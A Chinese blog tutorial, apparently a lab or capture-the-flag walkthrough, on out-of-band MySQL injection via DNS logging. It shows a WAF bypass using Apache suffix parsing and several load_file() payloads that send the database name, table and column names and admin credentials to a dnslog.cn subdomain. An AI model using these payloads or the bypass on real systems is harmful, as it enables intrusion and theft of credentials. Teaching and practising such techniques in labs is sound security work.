---
title: MySQL数据库的dnslog注入
tags: 
  - sql注入
  - 盲注
categories: web安全
keywords: 'MySQL,dnslog,sql注入'
description: MySQL数据库的dnslog注入
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F20428239-e2a9abb837deef3e.png&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915755&t=4e5de1dc3865a304f901e8b162c2a111
date: 2020-05-23 18:44:18
---

MySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。
### 中华人民共和国网络安全法
我们要做一名合法的白帽子！
![upload successful](/images/pasted-41.png)

![upload successful](/images/pasted-42.png)

![upload successful](/images/pasted-43.png)

### dns注入使用前提
1.数据库为Mysql		
2.在mysql.ini配置文件里面需要有一句：secure_file_priv=
3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。

### Dnslog 注入具体流程
1.首先打开靶场

![upload successful](/images/pasted-78.png)

2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化

![upload successful](/images/pasted-79.png)

3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入

![upload successful](/images/pasted-80.png)

4.闭合之后想要order by 猜当期字段数的，发现有安全狗

![upload successful](/images/pasted-81.png)

5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测）

![upload successful](/images/pasted-82.png)

6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合

![upload successful](/images/pasted-83.png)

7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名	
(网址为http://dnslog.cn/	，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击**Get SubDomain**申请一个域名，然后点击**Refresh Record**获取日志信息)

![upload successful](/images/pasted-84.png)

8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。
```
?id=1 or load_file(concat('//',(select database()),'.e124fu.dnslog.cn/abc'))
```

![upload successful](/images/pasted-87.png)

9.回到dnslog的页面访问日志看到库名为mangzhu

![upload successful](/images/pasted-88.png)

10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin
```
?id=1 or load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.e124fu.dnslog.cn/abc'))
```
![upload successful](/images/pasted-89.png)

11.第二个表名为news

![upload successful](/images/pasted-90.png)

12.接下来获取admin表的字段
```
?id=1 or load_file(concat('//',(select column_name from information_schema.columns where table_name='admin' limit 0,1),'.e124fu.dnslog.cn/abc'))
```
可以看到有username，password
![upload successful](/images/pasted-91.png)

13.一般我们就是获取里面的username和password字段的值
```
id=1 or load_file(concat('//',(select username from admin where Id=1),'.e124fu.dnslog.cn/abc'))
```
![upload successful](/images/pasted-92.png)

14.第一个username值为flag，那就获取对应的第一个password的值，得到flag
```
id=1 or load_file(concat('//',(select password from admin where Id=1),'.e124fu.dnslog.cn/abc'))
```
![upload successful](/images/pasted-93.png)

![upload successful](/images/pasted-94.png)

15.提交flag，成功通关！

![upload successful](/images/pasted-95.png)

